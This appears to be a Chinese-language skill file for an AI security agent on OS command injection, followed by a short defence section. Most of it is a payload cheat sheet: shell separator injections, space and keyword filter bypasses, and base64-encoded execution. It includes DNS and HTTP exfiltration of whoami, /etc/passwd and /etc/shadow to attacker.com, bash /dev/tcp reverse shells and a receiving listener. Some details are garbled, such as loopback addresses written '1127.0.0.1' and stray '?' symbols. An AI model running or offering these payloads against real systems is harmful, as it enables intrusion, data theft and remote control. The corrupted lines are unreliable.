---
name: web-rce-001
description: "命令注入允许攻击者通过操控应用程序传递给操作系统 shell 的参数执行任意系统命令 适用于: 应用调用系统命令处理用户输入（如 ping、nslookup、tracert、convert、ffmpeg; 存在网络诊断工具（ping 测试、端口扫描、DNS 查询; 应用使用 system()、exec()、popen()、Runtime.exec() 等函数"
license: MIT
metadata:
  author: HOS-Sec-Engine
  version: 2026-06
  tags:
  - command-injection
  - os-command-injection
  - rce
  - blind-command-injection
  - dns-exfiltration
  - filter-bypass
  category: web
  risk-level: critical
  confidence: 0.93
---
# Command Injection Techniques
命令注入允许攻击者通过操控应用程序传递给操作系统 shell 的参数执行任意系统命令。与代码注入不同，命令注入直接执行操作系统命令，通常具有与 Web 应用进程相同的权限级别。命令注入可分为有回显（输出直接返回）和盲注（无输出回显，需通过时间延迟、DNS 查询、HTTP 请求等带外通道验证）。现代应用中命令注入较少见但仍存在于网络诊断工具、图像处理、文档转换、系统管理等场景
## 何时使用

### 触发场景

- 应用调用系统命令处理用户输入（如 ping、nslookup、tracert、convert、ffmpeg
- 存在网络诊断工具（ping 测试、端口扫描、DNS 查询
- 应用使用 system()、exec()、popen()、Runtime.exec() 等函数
- 文件处理功能调用外部程序（图像处理、文档转换、压缩解压）
- 存在代码执行功能（在线编辑器、代码沙箱、REPL
- 应用调用 shell 脚本或批处理文件处理用户数据

### 关键词

`command injection`, `os command injection`, `rce`, `远程代码执行`, `命令注入`, `system()`, `exec()`, `shell_exec`, `Runtime.exec`, `blind rce`, `dns exfiltration`, `ping`, `traceroute`

### 识别指标

- 响应时间差异（命令执行延迟）
- DNS 查询日志中出现异常请求
- HTTP 请求从服务器发往攻击者控制的地址
- 错误信息暴露命令执行上下文

### 别名

`os command injection`, `shell injection`, `command execution`, `blind command injection`, `命令执行`, `盲注命令注入`, `oob rce`

## 操作检查清单

1. 识别用户输入是否被用于构造系统命令
2. 测试基础命令分隔符（; | && ||
3. 确定操作系统类型（Linux/Windows
4. 确定是否有回显（输出是否返回到响应中
5. 无回显：使用时间延迟验证（sleep 5 / ping -n 5
6. 无回显：使用 DNS exfiltration 外带数据
7. 测试过滤绕过（空格、引号、关键字
8. 尝试获取反向 shell
9. 确定命令执行的权限级
10. 探索进一步利用（权限提升、横向移动）

## 技术手段

- 命令分隔符注入：; | || && $(cmd) `cmd`
- 盲注时间延迟：sleep 5（Linux）、ping -n 5 1127.0.0.1（Windows/Linux
- DNS exfiltration: $(whoami).attacker.com ?`whoami`.attacker.com
- 空格绕过: ${IFS}、$%09、{cmd,arg}?IFS$9
- 引号绕过：使用变量拼接、hex 编码、base64 编码
- 关键字绕过：字符拼接（a=ca;b=t;$a$b /etc/passwd
- 编码绕过：base64 解码执行（echo xxx | base64 -d | bash
- HTTP exfiltration：curl http://attacker.com/$(whoami)
- 反向 shell：bash -i >& /dev/tcp/attacker.com/4444 0>&1
- PowerShell 命令注入（Windows）：-EncodedCommand base64

## 实战经验

### 症状

- 用户输入直接拼接到系统命令字符串
- 网络诊断功能（ping、traceroute）的输入参数未经过滤
- 命令执行结果的部分内容反映在响应
- 响应时间与输入参数长度或内容相关
- 错误信息暴露了底层命令的结构

### 根因分析

- 使用不安全的函数执行系统命令（system、exec、shell_exec、popen）
- 用户输入直接拼接到命令字符串中，未使用参数化调用
- 黑名单过滤不完整（遗漏命令分隔符、管道符、重定向符）
- 对命令执行结果未做适当隔离，部分输出返回给用户
- 应用以高权限运行（root/Administrator），放大命令注入影响
- 外部程序调用时未限制参数范围

### 实战观察

- Linux 命令分隔符：; | || && $(cmd) `cmd` 均可注入额外命令
- Windows 命令分隔符：& | || && ^ | 以及 %COMSPEC%
- 盲注命令注入需要通过 side-channel（时间、DNS、HTTP）验证
- DNS exfiltration 适合盲注场景，通过 $(cmd).attacker.com 外带命令输出
- 空格和特殊字符的黑名单过滤可通过编码、变量、IFS 绕过
- Java Runtime.exec() 不使用 shell 解析，命令分隔符无效，但可利用参数注入
- Python subprocess.call(shell=True) 等同于 system()，shell=False 更安全
- 命令注入与代码注入的区别：前者执行 OS 命令，后者执行应用层代码

### 常见错误

- 只测试 ; 或 | 分隔符，遗漏 &&、||、反引号
- 盲注场景中未正确设置接收服务器捕获带外数据
- 未识别操作系统类型（Linux/Windows），使用不兼容的 payload
- 空格被过滤时未尝试 ${IFS}、$%09 等替代
- 忽略 Java Runtime.exec() ?shell 调用的区别
- 未测试引号、括号等过滤的绕过方式

### 补充说明

- 命令注入测试时应先用简单 payload（如 ;id; 或 |id|）确认漏洞存在
- 盲注场景优先使用时间延迟（sleep/ping -c）验证，再尝试数据外带
- DNS exfiltration 需要注意输出长度限制（DNS 标签最长 63 字符
- 命令注入的利用权限取决于 Web 应用进程的运行用户
- 现代框架尽量避免直接调用系统命令，推荐使用原生库替代
- WAF 对命令注入的检测通常包括关键字（system、exec、|? 等）

## 示例

### 基础 OS 命令注入

利用命令分隔符在合法命令后注入额外命令

```
场景: 应用执行 ping {user_input}

Linux 注入:
1127.0.0.1;id
1127.0.0.1|id
1127.0.0.1&&id
1127.0.0.1||id
1127.0.0.1$(id)
1127.0.0.1`id`

Windows 注入:
1127.0.0.1&whoami
1127.0.0.1|whoami
1127.0.0.1&&whoami
1127.0.0.1||whoami

命令分隔符说明:
;     - 顺序执行，无论前一条是否成功
|     - 管道符，前一条输出作为后一条输入
||    - 前一条失败时执行后一条
&&    - 前一条成功时执行后一条
$()   - 命令替换，执行括号内命令并替换结果
``    - 反引号，与 $() 功能相同

Payload 选择:
- 有回? 1127.0.0.1;id（输出直接显示）
- 盲注: 1127.0.0.1;sleep 5（通过响应时间判断）
```

### 盲注命令注入 - DNS Exfiltration

在无回显场景下，通过 DNS 查询外带命令执行结果

```
原理: 将命令输出拼接到 DNS 查询域名中
攻击者监听 DNS 查询日志获取命令输出

Linux DNS Exfiltration:
nslookup $(whoami).attacker.com
dig $(id).attacker.com
ping `cat /etc/passwd | head -1 | tr ':' '.'`.attacker.com

Windows DNS Exfiltration:
nslookup %USERNAME%.attacker.com
ping %COMPUTERNAME%.attacker.com

使用工具:
1. 配置 burpcollaborator.com ?interact.sh 接收 DNS 查询
2. 自建 DNS 服务器或使用 dnsbin.zhack.ca
3. Payload: ping $(whoami).xxxxxx.burpcollaborator.net

处理长输出
for f in $(cat /etc/passwd | cut -d: -f1); do
  nslookup $f.attacker.com;
done

Base64 编码输出:
nslookup $(cat /etc/passwd | base64 | cut -c1-63).attacker.com

注意: DNS 标签最长 63 字符，长输出需要分段
```

### 空格过滤绕过

当空格被过滤时，使用替代方式在命令中表示空白字符

```
场景: 应用过滤了输入中的空格字符

Linux 绕过方式:
1. ${IFS}       - Shell 内部字段分隔符变量
   cat${IFS}/etc/passwd

2. ${IFS##9}    - IFS 的变体（去除数字 9）
   cat${IFS##9}/etc/passwd

3. $IFS$9       - IFS 后接 $9（第 9 个位置参数，通常为空）
   cat$IFS$9/etc/passwd

4. <            - 重定向符替代空格（仅用于文件参数）
   cat</etc/passwd

5. {cmd,arg}    - 大括号扩展
   {cat,/etc/passwd}

6. %09 / %0a    - URL 编码的 Tab / 换行
   cat%09/etc/passwd

7. 制表?       - 直接插入 Tab 字符（\t）
   cat\t/etc/passwd

8. 变量赋值
   a=/etc/passwd;cat$a

Windows 绕过:
1. %PROGRAMDATA:~0,1%  - 环境变量子串（通常为空格）
2. 使用 Tab 键生成的空格
3. 逗号替代空格（部分命令支持）: dir,c:\
```

### 关键字黑名单绕过

当命令关键字（cat、ls、whoami 等）被过滤时，使用变体绕过

```
场景: 应用过滤了常见命令关键字

命令关键字绕过:
1. 反斜杠转义 c\at /etc/passwd
2. 引号分割: ca''t /etc/passwd ?ca""t /etc/passwd
3. 变量拼接: a=c;b=at;$a$b /etc/passwd
4. 反向引用: echo 'cat /etc/passwd' | rev | sh
5. Base64: echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | sh
6. Octal/Hex: $(printf '\143\141\164') /etc/passwd
7. 通配符 /???/??t /???/p??s?? (匹配 /bin/cat /etc/passwd)
8. 符号链接: ln -s /bin/cat /tmp/x; /tmp/x /etc/passwd

关键字绕过矩阵:
cat     ?c\at, ca""t, /???/??t, base64_decode
ls      ?l\s, l""s, /???/ls, echo *
whoami  ?who\ami, who""ami, id
wget    ?w\get, wge\t, curl 替代
bash    ?b\ash, ba\sh, sh, /bin/sh

过滤绕过通用思路:
1. 转义字符（\、引号）
2. 变量拼接
3. 编码（base64、hex、octal）
4. 通配符
5. 替代命令
```

### Base64 编码命令注入

将命令进行 base64 编码后通过解码执行，绕过关键字和特殊字符过滤

```
编码命令:
echo 'cat /etc/passwd' | base64
输出: Y2F0IC9ldGMvcGFzc3dkCg==

注入 Payload:
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh

复杂命令:
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | base64
Payload: echo {base64} | base64 -d | bash

绕过过滤
如果 base64 也被过滤:
echo Y2F0 | rev | base64 -d  (反向编码)
printf '\x63\x61\x74' (hex 编码)

Python 编码:
python -c 'import os; os.system("cat /etc/passwd")'
python3 -c 'import base64; exec(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2NhdCAvZXRjL3Bhc3N3ZCcp"))'

Perl 编码:
perl -e 'print `cat /etc/passwd`'
perl -MMIME::Base64 -e 'system(decode_base64("Y2F0IC9ldGMvcGFzc3dk"))'

适用场景:
- 关键字过滤严格但允许 echo/base64
- 需要注入包含特殊字符的复杂命令
- 反向 shell payload 注入
```

### 带外 (OOB) HTTP 命令注入

通过 HTTP 请求将命令输出发送到攻击者控制的服务

```
Linux HTTP Exfiltration:
curl http://attacker.com/$(whoami)
curl http://attacker.com/$(id | base64)
curl http://attacker.com/?data=$(cat /etc/passwd | base64)
wget http://attacker.com/$(hostname)

Windows HTTP Exfiltration:
curl http://attacker.com/%USERNAME%
powershell -c "Invoke-WebRequest http://attacker.com/$env:USERNAME"
bitsadmin /transfer myjob http://attacker.com/%COMPUTERNAME%

接收端设置 (Python):
from http.server import HTTPServer, BaseHTTPRequestHandler
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'Received: {self.path}')
        self.send_response(200)
        self.end_headers()
HTTPServer(('', 80), Handler).serve_forever()

使用协作平台:
curl http://xxxxxx.oastify.com/$(whoami)
curl http://xxxxxx.interact.sh/$(id)

POST 方式 (适合大数据:
curl -X POST -d "$(cat /etc/passwd)" http://attacker.com/
wget --post-data="$(cat /etc/shadow)" http://attacker.com/
```

### Java Runtime.exec() 命令注入

针对 Java Runtime.exec() 的特殊命令注入技术

```
Java Runtime.exec() 特点:
- 不使用 shell 解析命令
- 命令分隔符(; | && ||) 无效
- 但可利用参数注入

场景: Runtime.getRuntime().exec("ping " + userInput)

参数注入:
userInput: -c 1 1127.0.0.1; cat /etc/passwd
实际执行: ping -c 1 1127.0.0.1; cat /etc/passwd
(注意: 如果 exec 传入的是字符串数组，则 ; 无效)

如果 exec 传入字符串(shell=true 效果):
Runtime.getRuntime().exec("bash -c {echo,Y2F0IC9ldGMvcGFzc3dk}|{base64,-d}|{bash,-i}")

Bash 特性利用
1. bash -c "command" 可执行任意命令
2. 环境变量: bash -c 'echo $PATH'
3. Bash 通配符 bash -c 'cat /etc/pass*'

ProcessBuilder 注入:
ProcessBuilder pb = new ProcessBuilder("cmd", userInput);
如果 userInput = "/c", "calc.exe" ?参数注入

关键区别:
exec(String)     ?通过 /bin/sh -c 执行，支持命令分隔符
exec(String[])   ?直接执行，不支持命令分隔符
ProcessBuilder   ?直接执行，不支持命令分隔符
```

## 验证标准

### 验证指标

- 命令执行结果出现在 HTTP 响应
- 响应时间明显延迟（sleep/ping 命令执行
- 攻击者服务器收到来自目标的 DNS 查询或 HTTP 请求
- 反向 shell 连接成功建立
- 错误信息暴露命令执行上下文

### 成功标志

- id/whoami 命令输出出现在响应中
- sleep/ping 命令导致响应时间增加对应秒数
- DNS 查询日志中出现包含命令输出的域名
- HTTP 服务器收到包含命令外带数据的请求
- 反向 shell 在攻击者监听的端口上建立连
- 文件读取命令（cat /etc/passwd）返回文件内容

### 误报标志

- 响应延迟由网络波动而非 sleep 命令导致
- DNS 查询由其他机制触发（如页面加载外部资源）
- 响应中的信息来自缓存或静态内容而非命令执行
- 命令注入 payload 被当作普通字符串返回

## 防御建议

### 推荐做法

- 避免调用系统命令，使用语言原生库替代（如使用 Java InetAddress 替代 ping
- 必须调用系统命令时，使用参数化调用（exec(String[]) 而非 exec(String)
- 使用白名单验证输入：只允许预期的字符集（如IP 地址只允许数字和点）
- 对用户输入进行严格的格式验证（正则匹配，IP 地址、域名等），
- 避免使用 shell=true / shell=True 执行命令
- 最小化应用进程权限，避免以 root/Administrator 运行
- 使用 chroot 或容器隔离命令执行环境
- 对命令输出进行过滤，避免将敏感信息返回给用户

### 缓解措施

- 实施输入验证和编码，拒绝包含命令分隔符的输入
- 使用安全封装函数替代直接系统调用
- 配置 WAF 规则检测命令注入 payload（| | && || $() 等）
- 监控异常的系统进程创建（Web 进程不应创建 shell
- 使用 AppArmor/SELinux 限制进程可执行的命令
- 实施网络出站策略，限制应用服务器可访问的外部地址

## 参考链接

- https://owasp.org/www-community/attacks/Command_Injection
- https://portswigger.net/web-security/os-command-injection
- https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- https://book.hacktricks.xyz/pentesting-web/command-injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
